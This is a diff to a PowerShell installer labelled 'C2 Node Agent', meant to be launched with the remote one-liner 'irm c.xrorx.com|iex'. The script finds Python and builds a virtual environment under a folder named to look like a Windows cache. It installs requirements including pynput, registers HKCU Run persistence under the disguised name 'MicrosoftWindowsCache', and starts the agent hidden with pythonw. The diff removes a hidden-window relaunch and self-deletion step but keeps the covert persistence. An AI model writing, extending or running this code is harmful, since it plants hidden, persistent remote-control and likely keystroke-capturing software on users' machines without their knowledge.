@@ -1,10 +1,10 @@
 <#
 .SYNOPSIS
-    C2 Node Agent - Silent user-level installer (no elevation)
+    C2 Node Agent - Quiet user-level installer (no elevation)
 
 .DESCRIPTION
-    Immediately relaunches itself in a hidden PowerShell window and exits
-    the visible terminal. Installs under the current user only (HKCU Run).
+    Installs under the current user only (HKCU Run).
+    Prints "..." while running, then "[]" when finished.
 
 .EXAMPLE
     powershell "irm c.xrorx.com|iex"
@@ -12,7 +12,6 @@
 #>
 
 param(
-    [switch]$Bg,
     [string]$InstallPath = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache"
 )
 
@@ -22,40 +21,8 @@ $WarningPreference = "SilentlyContinue"
 $InformationPreference = "SilentlyContinue"
 $VerbosePreference = "SilentlyContinue"
 
-# ---------------------------------------------------------------------------
-# Visible invoke → spawn hidden worker and close this terminal immediately
-# ---------------------------------------------------------------------------
-if (-not $Bg) {
-    try {
-        $tmp = Join-Path $env:TEMP ("wscache-" + [guid]::NewGuid().ToString("N").Substring(0, 12) + ".ps1")
+Write-Host "..."
 
-        if ($PSCommandPath -and (Test-Path -LiteralPath $PSCommandPath)) {
-            Copy-Item -LiteralPath $PSCommandPath -Destination $tmp -Force
-        } else {
-            $body = $MyInvocation.MyCommand.ScriptBlock.ToString()
-            @(
-                "param([switch]`$Bg, [string]`$InstallPath = '$InstallPath')"
-                $body
-            ) -join "`n" | Set-Content -LiteralPath $tmp -Encoding UTF8
-        }
-
-        Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList @(
-            "-NoProfile",
-            "-WindowStyle", "Hidden",
-            "-ExecutionPolicy", "Bypass",
-            "-File", "`"$tmp`"",
-            "-Bg",
-            "-InstallPath", "`"$InstallPath`""
-        ) | Out-Null
-    } catch {}
-
-    try { Stop-Process -Id $PID -Force } catch { [Environment]::Exit(0) }
-    return
-}
-
-# ---------------------------------------------------------------------------
-# Hidden background install (current user only — no admin / UAC)
-# ---------------------------------------------------------------------------
 try {
     $procs = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object {
         ($_.Name -eq "python.exe" -or $_.Name -eq "pythonw.exe") -and
@@ -87,7 +54,10 @@ try {
         } catch {}
     }
 
-    if (-not $pythonPath) { [Environment]::Exit(1) }
+    if (-not $pythonPath) {
+        Write-Host "[]"
+        exit 1
+    }
 
     $pythonDir = Split-Path $pythonPath
     $pythonwPath = Join-Path $pythonDir "pythonw.exe"
@@ -119,7 +89,10 @@ while True: time.sleep(60)
         }
         & $pythonPath -m venv $venvPath 2>&1 | Out-Null
     }
-    if (-not (Test-Path $pyvenvCfg)) { [Environment]::Exit(1) }
+    if (-not (Test-Path $pyvenvCfg)) {
+        Write-Host "[]"
+        exit 1
+    }
 
     $venvPython = Join-Path $venvPath "Scripts\python.exe"
     $venvPythonw = Join-Path $venvPath "Scripts\pythonw.exe"
@@ -135,7 +108,6 @@ pynput>=1.7.0
     $uvExe = Join-Path $venvPath "Scripts\uv.exe"
     & $uvExe pip install -r $reqFile --python $venvPython --quiet 2>&1 | Out-Null
 
-    # User-level persistence only
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $name = "MicrosoftWindowsCache"
     $cmd = "cmd /c cd /d `"$venvPath`" && `"$venvPythonw`" `"$agentPyPath`""
@@ -152,17 +124,8 @@ pynput>=1.7.0
         $sh.Save()
     }
 
-    Start-Sleep -Seconds 1
     Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" `
         -WorkingDirectory $venvPath -WindowStyle Hidden
-    Start-Sleep -Seconds 2
 } catch {}
 
-# Clean temp bootstrap copy
-try {
-    if ($PSCommandPath -and $PSCommandPath -like "*\wscache-*.ps1") {
-        Remove-Item -LiteralPath $PSCommandPath -Force -ErrorAction SilentlyContinue
-    }
-} catch {}
-
-[Environment]::Exit(0)
+Write-Host "[]"
